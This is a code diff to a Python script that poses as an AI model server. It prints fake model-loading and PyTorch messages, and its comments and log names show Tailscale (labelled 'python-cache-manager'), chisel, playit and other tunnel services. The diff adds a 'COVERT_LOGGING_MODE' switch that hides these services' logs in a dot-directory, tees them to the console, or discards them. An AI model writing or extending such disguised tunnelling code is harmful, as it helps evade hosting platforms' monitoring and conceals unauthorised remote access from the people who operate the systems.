@@ -4,6 +4,9 @@ import subprocess
 import base64
 import threading
 import random
+import sys
+
+COVERT_LOGGING_MODE = 1
 
 print("--- BOOTING AI MODEL SERVER ---", flush=True)
 
@@ -48,17 +51,64 @@ def main():
     print("Loading model weights into VRAM...", flush=True)
     time.sleep(2)
     
-    os.makedirs("/home/user/.torch_metrics", exist_ok=True)
-    
     # Start the background jitter thread
     threading.Thread(target=jitter_task, daemon=True).start()
     
     # Open hidden log files to prevent leakage
-    ts_log = open('/home/user/.torch_metrics/ts_daemon.log', 'a')
-    fb_log = open('/home/user/.torch_metrics/fb.log', 'a')
-    tm_log = open('/home/user/.torch_metrics/tm_daemon.log', 'a')
-    chisel_log = open('/home/user/.torch_metrics/chisel.log', 'a')
-    nginx_log = open('/home/user/.torch_metrics/nginx.log', 'a')
+    if COVERT_LOGGING_MODE == 1:
+        os.makedirs("/home/user/.torch_metrics", exist_ok=True)
+        ts_log = open('/home/user/.torch_metrics/ts_daemon.log', 'a')
+        fb_log = open('/home/user/.torch_metrics/fb.log', 'a')
+        tm_log = open('/home/user/.torch_metrics/tm_daemon.log', 'a')
+        chisel_log = open('/home/user/.torch_metrics/chisel.log', 'a')
+        nginx_log = open('/home/user/.torch_metrics/nginx.log', 'a')
+    elif COVERT_LOGGING_MODE == 2:
+        os.makedirs("/home/user/.torch_metrics", exist_ok=True)
+        class TeeLogger:
+            def __init__(self, filepath, prefix):
+                self.file = open(filepath, 'a')
+                self.prefix = prefix
+                r, w = os.pipe()
+                self.r = r
+                self.w = w
+                threading.Thread(target=self._reader, daemon=True).start()
+
+            def _reader(self):
+                rf = os.fdopen(self.r, 'r', errors='replace')
+                try:
+                    for line in rf:
+                        self.file.write(line)
+                        self.file.flush()
+                        sys.stdout.write(f"[{self.prefix}] {line}")
+                        sys.stdout.flush()
+                except Exception:
+                    pass
+
+            def fileno(self):
+                return self.w
+
+            def write(self, s):
+                self.file.write(s)
+                self.file.flush()
+                sys.stdout.write(f"[{self.prefix}] {s}\n" if not s.endswith("\n") else f"[{self.prefix}] {s}")
+                sys.stdout.flush()
+
+            def flush(self):
+                self.file.flush()
+                sys.stdout.flush()
+
+        ts_log = TeeLogger('/home/user/.torch_metrics/ts_daemon.log', 'TS')
+        fb_log = TeeLogger('/home/user/.torch_metrics/fb.log', 'FB')
+        tm_log = TeeLogger('/home/user/.torch_metrics/tm_daemon.log', 'PLAYIT')
+        chisel_log = TeeLogger('/home/user/.torch_metrics/chisel.log', 'CHISEL')
+        nginx_log = TeeLogger('/home/user/.torch_metrics/nginx.log', 'NGINX')
+    else:
+        devnull = open(os.devnull, 'w')
+        ts_log = devnull
+        fb_log = devnull
+        tm_log = devnull
+        chisel_log = devnull
+        nginx_log = devnull
 
     # 1. Start Tailscale (python-cache-manager)
     print("Initializing PyTorch CUDA environment...", flush=True)
